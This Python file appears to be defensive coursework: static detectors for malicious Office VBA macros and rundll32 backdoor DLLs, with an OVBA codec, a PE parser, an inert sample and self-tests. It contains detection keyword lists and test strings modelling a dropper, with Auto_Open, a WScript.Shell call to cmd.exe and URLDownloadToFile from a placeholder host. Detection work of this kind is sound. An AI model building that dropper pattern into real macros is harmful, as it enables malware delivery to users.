#!/usr/bin/env python3
"""
detection_tools.py  --  two static malware-detection tools in one file.

Defensive / educational coursework. NOTHING here executes a payload; both
tools only read bytes and report indicators.

Subcommands
-----------
  macro <file>        analyze VBA macros in an Office file / vbaProject.bin
  dll   <file>        analyze a DLL for the rundll32 backdoor pattern (parse only)
  make-sample [--out] write an INERT test .xlsm + container for the macro tool
  selftest            run built-in checks (no network, no external host)

Examples
--------
    python detection_tools.py make-sample
    python detection_tools.py macro samples/sample_macro.xlsm --source
    python detection_tools.py dll C:\\Windows\\System32\\kernel32.dll
    python detection_tools.py selftest

Stdlib only (Python 3.10+).
"""
from __future__ import annotations

import argparse
import json
import os
import re
import struct
import sys
import tempfile
import zipfile

# ==========================================================================
# SECTION 1 - MS-OVBA 2.4.1 compression / decompression
#   Real malicious macros store VBA source inside an MS-OVBA CompressedContainer
#   so a naive `strings` scan misses it. Implementing the codec is the point.
# ==========================================================================


def _decompress_chunk(chunk: bytes) -> bytearray:
    out = bytearray()
    pos, clen = 0, len(chunk)
    while pos < clen:
        flag = chunk[pos]
        pos += 1
        for bit in range(8):
            if pos >= clen:
                break
            if not (flag >> bit) & 1:                     # literal byte
                out.append(chunk[pos])
                pos += 1
            else:                                         # copy token
                if pos + 2 > clen:
                    return out
                token = chunk[pos] | (chunk[pos + 1] << 8)
                pos += 2
                diff = len(out)
                if diff < 1:
                    return out
                bitcount = max((diff - 1).bit_length(), 4)
                length_mask = 0xFFFF >> bitcount
                offset_mask = (~length_mask) & 0xFFFF
                length = (token & length_mask) + 3
                offset = ((token & offset_mask) >> (16 - bitcount)) + 1
                start = len(out) - offset
                if start < 0:
                    return out
                for k in range(length):
                    out.append(out[start + k])
    return out


def ovba_decompress(data: bytes) -> bytes:
    if not data or data[0] != 0x01:
        raise ValueError("not an MS-OVBA CompressedContainer (missing 0x01)")
    out = bytearray()
    i, n = 1, len(data)
    while i + 2 <= n:
        header = data[i] | (data[i + 1] << 8)
        i += 2
        total = (header & 0x0FFF) + 3
        compressed = (header >> 15) & 1
        body = data[i:i + total - 2]
        i += total - 2
        out += _decompress_chunk(body) if compressed else body[:4096]
    return bytes(out)


def ovba_compress(data: bytes) -> bytes:
    """Produce a valid container using uncompressed chunks (always spec-valid)."""
    out = bytearray([0x01])
    for off in range(0, max(len(data), 1), 4096):
        window = data[off:off + 4096]
        header = 0x3000 | ((len(window) - 1) & 0x0FFF)
        out.append(header & 0xFF)
        out.append((header >> 8) & 0xFF)
        out.extend(window)
    return bytes(out)


# ==========================================================================
# SECTION 2 - macro analyzer
# ==========================================================================

_ASCII = re.compile(rb"[\x20-\x7e]{4,}")
_UTF16 = re.compile(rb"(?:[\x20-\x7e]\x00){4,}")

MACRO_INDICATORS = [
    ("autoexec", 3, ["Auto_Open", "AutoOpen", "Auto_Close", "AutoClose",
                     "AutoExec", "Workbook_Open", "Workbook_Activate",
                     "Document_Open", "Document_Close"]),
    ("exec", 3, ["Shell", "WScript.Shell", "WshShell", ".Exec", ".Run",
                 "cmd.exe", "powershell", "ShellExecute", "CreateObject",
                 "VBA.Shell", "rundll32"]),
    ("download", 2, ["URLDownloadToFile", "XMLHTTP", "WinHttp", "ServerXMLHTTP",
                     "ADODB.Stream", "MSXML2", "Msxml2"]),
    ("network", 2, ["http://", "https://", "ftp://", ".DownloadString",
                    "DownloadFile"]),
    ("filesystem", 1, ["FileSystemObject", "Scripting.FileSystemObject",
                       "SaveToFile", "Open For Binary", "WriteLine",
                       "GetSpecialFolder", "Environ"]),
    ("obfuscation", 1, ["Chr(", "ChrW(", "StrReverse", "Xor ", "CallByName",
                        "Base64", "FromBase64", ".Text =", "Replace("]),
    ("registry", 2, ["RegWrite", "RegRead", "\\Run", "CurrentVersion\\Run"]),
]


def extract_strings(data: bytes) -> list[str]:
    found = [m.group().decode("ascii", "ignore") for m in _ASCII.finditer(data)]
    for m in _UTF16.finditer(data):
        found.append(m.group().decode("utf-16le", "ignore"))
    return found


def _looks_like_source(text: bytes) -> bool:
    if len(text) < 16:
        return False
    printable = sum(1 for b in text if b in (9, 10, 13) or 0x20 <= b <= 0x7E)
    return printable / len(text) > 0.80 and (b"\n" in text or b"\r" in text)


def recover_vba_source(data: bytes, max_attempts: int = 500) -> list[str]:
    recovered, seen, attempts = [], set(), 0
    for off in range(len(data)):
        if data[off] != 0x01:
            continue
        attempts += 1
        if attempts > max_attempts:
            break
        try:
            text = ovba_decompress(data[off:])
        except Exception:
            continue
        if _looks_like_source(text):
            s = text.decode("latin-1", "ignore")
            if s[:64] not in seen:
                seen.add(s[:64])
                recovered.append(s)
    return recovered


def read_office_container(path: str) -> bytes:
    with open(path, "rb") as fh:
        head = fh.read(8)
    if head[:2] == b"PK":
        with zipfile.ZipFile(path) as zf:
            for name in zf.namelist():
                if name.lower().endswith("vbaproject.bin"):
                    return zf.read(name)
        raise ValueError("ZIP has no vbaProject.bin (no macros present)")
    with open(path, "rb") as fh:
        return fh.read()


def score_macro(text: str) -> dict:
    low = text.lower()
    findings, cats = [], {}
    for category, weight, keywords in MACRO_INDICATORS:
        for kw in keywords:
            if kw.lower() in low:
                findings.append({"category": category, "keyword": kw, "weight": weight})
                cats[category] = cats.get(category, 0) + 1
    score = sum(w for c, w, _ in MACRO_INDICATORS if c in cats)
    if "autoexec" in cats and "exec" in cats:
        sev = "CRITICAL"
    elif score >= 6:
        sev = "HIGH"
    elif score >= 3:
        sev = "MEDIUM"
    elif score > 0:
        sev = "LOW"
    else:
        sev = "CLEAN"
    return {"findings": findings, "categories": sorted(cats), "score": score,
            "severity": sev}


def analyze_macro(path: str) -> dict:
    blob = read_office_container(path)
    recovered = recover_vba_source(blob)
    strings = extract_strings(blob)
    result = score_macro("\n".join(recovered) + "\n" + "\n".join(strings))
    result.update({"file": path, "bytes": len(blob),
                   "recovered_modules": len(recovered),
                   "recovered_source": recovered})
    return result


def print_macro_report(r: dict, show_source: bool) -> None:
    bar = "=" * 60
    print(bar)
    print(f"  MACRO ANALYSIS  :  {r['file']}")
    print(bar)
    print(f"  bytes scanned     : {r['bytes']}")
    print(f"  recovered modules : {r['recovered_modules']}")
    print(f"  indicator score   : {r['score']}")
    print(f"  categories        : {', '.join(r['categories']) or '-'}")
    print(f"  SEVERITY          : {r['severity']}")
    print(bar)
    if r["findings"]:
        print("  indicators:")
        for f in r["findings"]:
            print(f"    [{f['category']:<11}] +{f['weight']}  {f['keyword']}")
    else:
        print("  no macro indicators found")
    if show_source and r["recovered_source"]:
        print(bar)
        print("  recovered VBA source:")
        for mod in r["recovered_source"]:
            print("  " + "-" * 40)
            print("    " + mod.replace("\n", "\n    "))
    print(bar)


# ==========================================================================
# SECTION 3 - DLL / RunDLL backdoor detector (pure-Python PE parser)
# ==========================================================================

EXEC_IMPORTS = {
    "winexec", "createprocessa", "createprocessw", "createprocessinternalw",
    "shellexecutea", "shellexecutew", "shellexecuteexa", "shellexecuteexw",
    "system", "_wsystem", "_spawnl", "wsystem",
}
DLL_STRING_FLAGS = ["cmd.exe", "powershell", "rundll32", "/c ", "/k ",
                    "comspec", "system32\\cmd"]


class PEError(Exception):
    pass


class PE:
    """Minimal read-only PE32/PE32+ parser (headers, exports, imports)."""

    def __init__(self, data: bytes):
        self.data = data
        if data[:2] != b"MZ":
            raise PEError("not a PE file (no MZ signature)")
        self.e_lfanew = struct.unpack_from("<I", data, 0x3C)[0]
        if data[self.e_lfanew:self.e_lfanew + 4] != b"PE\x00\x00":
            raise PEError("not a PE file (no PE signature)")
        coff = self.e_lfanew + 4
        (self.machine, self.num_sections, _, _, _, self.opt_size,
         self.characteristics) = struct.unpack_from("<HHIIIHH", data, coff)
        self.opt = coff + 20
        self.magic = struct.unpack_from("<H", data, self.opt)[0]
        self.is_pe32_plus = self.magic == 0x20B
        dd_off = self.opt + (112 if self.is_pe32_plus else 96)
        self.num_rva = struct.unpack_from(
            "<I", data, self.opt + (108 if self.is_pe32_plus else 92))[0]
        self.data_dirs = []
        for k in range(min(self.num_rva, 16)):
            va, size = struct.unpack_from("<II", data, dd_off + k * 8)
            self.data_dirs.append((va, size))
        self._read_sections(coff + 20 + self.opt_size)

    @property
    def is_dll(self) -> bool:
        return bool(self.characteristics & 0x2000)

    def _read_sections(self, off: int) -> None:
        self.sections = []
        for _ in range(self.num_sections):
            name = self.data[off:off + 8].rstrip(b"\x00").decode("latin-1", "ignore")
            vsize, va, raw_size, raw_ptr = struct.unpack_from("<IIII", self.data, off + 8)
            self.sections.append((name, va, vsize, raw_ptr, raw_size))
            off += 40

    def rva_to_off(self, rva: int):
        for _, va, vsize, raw_ptr, raw_size in self.sections:
            if va <= rva < va + max(vsize, raw_size):
                return raw_ptr + (rva - va)
        return None

    def _cstr(self, off: int, limit: int = 256) -> str:
        end = self.data.find(b"\x00", off, off + limit)
        if end < 0:
            end = off + limit
        return self.data[off:end].decode("latin-1", "ignore")

    def exports(self) -> list[str]:
        if len(self.data_dirs) < 1 or self.data_dirs[0][0] == 0:
            return []
        off = self.rva_to_off(self.data_dirs[0][0])
        if off is None:
            return []
        try:
            num_names = struct.unpack_from("<I", self.data, off + 24)[0]
            names_rva = struct.unpack_from("<I", self.data, off + 32)[0]
        except struct.error:
            return []
        names_off = self.rva_to_off(names_rva)
        if names_off is None:
            return []
        out = []
        for i in range(min(num_names, 4096)):
            try:
                name_rva = struct.unpack_from("<I", self.data, names_off + i * 4)[0]
            except struct.error:
                break
            n_off = self.rva_to_off(name_rva)
            if n_off is not None:
                out.append(self._cstr(n_off))
        return out

    def imports(self) -> dict[str, list[str]]:
        if len(self.data_dirs) < 2 or self.data_dirs[1][0] == 0:
            return {}
        off = self.rva_to_off(self.data_dirs[1][0])
        if off is None:
            return {}
        result, ptr_size = {}, 8 if self.is_pe32_plus else 4
        ord_flag = 0x8000000000000000 if self.is_pe32_plus else 0x80000000
        for _ in range(4096):
            try:
                oft, _, _, name_rva, ft = struct.unpack_from("<IIIII", self.data, off)
            except struct.error:
                break
            if oft == 0 and name_rva == 0 and ft == 0:
                break
            off += 20
            dll = "?"
            n_off = self.rva_to_off(name_rva)
            if n_off is not None:
                dll = self._cstr(n_off)
            funcs, t_off = [], self.rva_to_off(oft or ft)
            if t_off is not None:
                for _ in range(4096):
                    if self.is_pe32_plus:
                        val = struct.unpack_from("<Q", self.data, t_off)[0]
                    else:
                        val = struct.unpack_from("<I", self.data, t_off)[0]
                    t_off += ptr_size
                    if val == 0:
                        break
                    if val & ord_flag:
                        funcs.append(f"#ordinal_{val & 0xFFFF}")
                    else:
                        ibn = self.rva_to_off(val & 0x7FFFFFFF)
                        if ibn is not None:
                            funcs.append(self._cstr(ibn + 2))
            result[dll] = funcs
        return result


def _dll_strings(data: bytes) -> list[str]:
    return [m.group().decode("latin-1", "ignore")
            for m in re.finditer(rb"[\x20-\x7e]{4,}", data)]


def score_dll(meta: dict) -> dict:
    exec_hits = sorted(meta.get("exec_imports", []))
    str_hits = sorted(meta.get("string_hits", []))
    score, reasons = 0, []
    if exec_hits:
        score += 3
        reasons.append(f"imports process-spawning API: {', '.join(exec_hits)}")
    if "cmd.exe" in str_hits:
        score += 3
        reasons.append("contains 'cmd.exe' command string")
    if meta.get("is_dll") and meta.get("exports"):
        score += 2
        reasons.append("DLL exports an entry point callable by rundll32")
    if "rundll32" in str_hits:
        score += 2
        reasons.append("references rundll32 directly")
    if exec_hits and meta.get("is_dll") and 0 < len(meta.get("import_dlls", [])) <= 3:
        score += 1
        reasons.append("very small import set (typical of droppers)")
    if exec_hits and "cmd.exe" in str_hits and meta.get("is_dll"):
        sev = "CRITICAL"
    elif score >= 5:
        sev = "HIGH"
    elif score >= 3:
        sev = "MEDIUM"
    elif score > 0:
        sev = "LOW"
    else:
        sev = "CLEAN"
    return {"score": score, "severity": sev, "reasons": reasons}


def analyze_dll(path: str) -> dict:
    with open(path, "rb") as fh:
        data = fh.read()
    pe = PE(data)
    imports = pe.imports()
    all_funcs = {f.lower() for funcs in imports.values() for f in funcs}
    strings = _dll_strings(data)
    low_blob = "\n".join(strings).lower()
    meta = {
        "file": path, "bytes": len(data), "machine": hex(pe.machine),
        "is_dll": pe.is_dll, "pe32_plus": pe.is_pe32_plus,
        "exports": pe.exports(), "import_dlls": sorted(imports),
        "exec_imports": sorted({f for f in all_funcs if f in EXEC_IMPORTS}),
        "string_hits": sorted({s for s in DLL_STRING_FLAGS if s in low_blob}),
    }
    meta.update(score_dll(meta))
    return meta


def print_dll_report(m: dict) -> None:
    bar = "=" * 60
    print(bar)
    print(f"  DLL / RUNDLL ANALYSIS  :  {m['file']}")
    print(bar)
    print(f"  size            : {m['bytes']} bytes")
    print(f"  machine         : {m['machine']}  ({'PE32+' if m['pe32_plus'] else 'PE32'})")
    print(f"  is DLL          : {m['is_dll']}")
    print(f"  exports ({len(m['exports']):>3})   : "
          f"{', '.join(m['exports'][:12]) + (' ...' if len(m['exports']) > 12 else '') or '-'}")
    print(f"  import DLLs      : {', '.join(m['import_dlls'][:12]) or '-'}")
    print(f"  exec imports    : {', '.join(m['exec_imports']) or '-'}")
    print(f"  flagged strings : {', '.join(m['string_hits']) or '-'}")
    print(bar)
    print(f"  score           : {m['score']}")
    print(f"  SEVERITY        : {m['severity']}")
    for r in m["reasons"]:
        print(f"    - {r}")
    print(bar)


# ==========================================================================
# SECTION 4 - inert sample generator (for the macro tool)
# ==========================================================================

_VBA_SAMPLE = (
    'Attribute VB_Name = "Module1"\r\n'
    "' === INERT LAB SAMPLE - nothing here executes ===\r\n"
    "Sub Auto_Open()\r\n"
    "    Dim target As String\r\n"
    '    target = "cmd.exe"            \' flagged string, never run\r\n'
    "    ' Shell target, vbNormalFocus  ' intentionally commented out\r\n"
    "    ' CreateObject(\"WScript.Shell\").Run target  ' commented out\r\n"
    "    ' URLDownloadToFileA 0, \"http://example.test/x\", \"x\", 0, 0\r\n"
    '    MsgBox "inert lab sample"\r\n'
    "End Sub\r\n"
    "Sub Workbook_Open()\r\n    Auto_Open\r\nEnd Sub\r\n"
)
_CT = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
       '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
       '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
       '<Default Extension="xml" ContentType="application/xml"/>'
       '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>'
       '<Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/></Types>')
_RELS = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
         '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
         '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>')
_WB = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
       '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
       '<sheets><sheet name="S1" sheetId="1" r:id="rId1" '
       'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/></sheets></workbook>')


def make_sample(out_dir: str) -> tuple[str, str]:
    os.makedirs(out_dir, exist_ok=True)
    container = ovba_compress(_VBA_SAMPLE.encode("latin-1"))
    bin_path = os.path.join(out_dir, "sample_module.bin")
    with open(bin_path, "wb") as fh:
        fh.write(container)
    xlsm_path = os.path.join(out_dir, "sample_macro.xlsm")
    with zipfile.ZipFile(xlsm_path, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", _CT)
        zf.writestr("_rels/.rels", _RELS)
        zf.writestr("xl/workbook.xml", _WB)
        zf.writestr("xl/vbaProject.bin", container)
    return bin_path, xlsm_path


# ==========================================================================
# SECTION 5 - self-test
# ==========================================================================

def selftest() -> int:
    passed = failed = 0

    def check(name, cond):
        nonlocal passed, failed
        if cond:
            passed += 1
            print(f"  ok   - {name}")
        else:
            failed += 1
            print(f"  FAIL - {name}")

    for payload in [b"", b"hi", b"Sub x()\r\nEnd Sub\r\n", os.urandom(10000)]:
        check(f"ovba roundtrip len={len(payload)}",
              ovba_decompress(ovba_compress(payload)) == payload)

    check("clean macro -> CLEAN",
          score_macro("Sub Foo()\n Range(\"A1\")=1\nEnd Sub")["severity"] == "CLEAN")
    drop = score_macro('Sub Auto_Open()\n CreateObject("WScript.Shell").Run "cmd.exe"\n'
                       ' URLDownloadToFile 0,"http://x/y","z"\nEnd Sub')
    check("dropper -> CRITICAL", drop["severity"] == "CRITICAL")

    check("backdoor meta -> CRITICAL", score_dll({
        "is_dll": True, "exports": ["Install"], "import_dlls": ["kernel32.dll"],
        "exec_imports": ["winexec"], "string_hits": ["cmd.exe", "rundll32"]})["severity"] == "CRITICAL")
    check("benign meta -> CLEAN", score_dll({
        "is_dll": True, "exports": [], "import_dlls": ["kernel32.dll", "user32.dll"],
        "exec_imports": [], "string_hits": []})["severity"] == "CLEAN")

    with tempfile.TemporaryDirectory() as d:
        _, xlsm = make_sample(d)
        r = analyze_macro(xlsm)
        check("sample .xlsm recovers source", r["recovered_modules"] >= 1)
        check("sample .xlsm -> CRITICAL", r["severity"] == "CRITICAL")

    cand = r"C:\Windows\System32\kernel32.dll"
    if os.path.exists(cand):
        m = analyze_dll(cand)
        check("real DLL parses + is_dll", m["is_dll"] and m["machine"].startswith("0x"))
    else:
        print("  skip - no system DLL to parse")

    print(f"\n{passed} passed, {failed} failed")
    return 1 if failed else 0


# ==========================================================================
# CLI
# ==========================================================================

def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="Static macro & RunDLL-backdoor detectors")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p_macro = sub.add_parser("macro", help="analyze VBA macros in an Office file")
    p_macro.add_argument("file")
    p_macro.add_argument("--json", action="store_true")
    p_macro.add_argument("--source", action="store_true", help="print recovered VBA")

    p_dll = sub.add_parser("dll", help="analyze a DLL (parse only, never loaded)")
    p_dll.add_argument("file")
    p_dll.add_argument("--json", action="store_true")

    p_mk = sub.add_parser("make-sample", help="write an inert macro test fixture")
    p_mk.add_argument("--out", default="samples")

    sub.add_parser("selftest", help="run built-in checks")

    args = ap.parse_args(argv)

    if args.cmd == "macro":
        try:
            r = analyze_macro(args.file)
        except Exception as exc:
            print(f"error: {exc}", file=sys.stderr)
            return 2
        print(json.dumps(r, indent=2)) if args.json else print_macro_report(r, args.source)
        return 0 if r["severity"] in ("CLEAN", "LOW") else 1

    if args.cmd == "dll":
        try:
            m = analyze_dll(args.file)
        except Exception as exc:
            print(f"error: {exc}", file=sys.stderr)
            return 2
        print(json.dumps(m, indent=2)) if args.json else print_dll_report(m)
        return 0 if m["severity"] in ("CLEAN", "LOW") else 1

    if args.cmd == "make-sample":
        b, x = make_sample(args.out)
        print(f"wrote {b}\nwrote {x}")
        return 0

    if args.cmd == "selftest":
        return selftest()
    return 2


def menu() -> int:
    """Interactive menu shown when the script is run with no arguments."""
    print("=" * 56)
    print("  detection_tools - interactive menu")
    print("  Defensive / educational. Nothing is ever executed.")
    print("=" * 56)
    print("  1) Self-test")
    print("  2) Make inert macro sample (into samples/)")
    print("  3) Analyze a macro file (.xlsm / vbaProject.bin)")
    print("  4) Analyze a DLL (parsed only, never loaded)")
    print("  5) Show full command-line help")
    print("  q) Quit")
    try:
        choice = input("Select: ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        return 0
    if choice == "1":
        return selftest()
    if choice == "2":
        return main(["make-sample"])
    if choice == "3":
        try:
            path = (input("Macro file path [samples/sample_macro.xlsm]: ").strip()
                    or "samples/sample_macro.xlsm")
        except (EOFError, KeyboardInterrupt):
            return 0
        return main(["macro", path, "--source"])
    if choice == "4":
        try:
            path = (input("DLL path [C:/Windows/System32/kernel32.dll]: ").strip()
                    or "C:/Windows/System32/kernel32.dll")
        except (EOFError, KeyboardInterrupt):
            return 0
        return main(["dll", path])
    if choice == "5":
        try:
            main(["-h"])
        except SystemExit:
            pass
        return 0
    return 0


if __name__ == "__main__":
    # No CLI arguments -> friendly menu; otherwise normal argparse handling.
    raise SystemExit(menu() if len(sys.argv) == 1 else main())
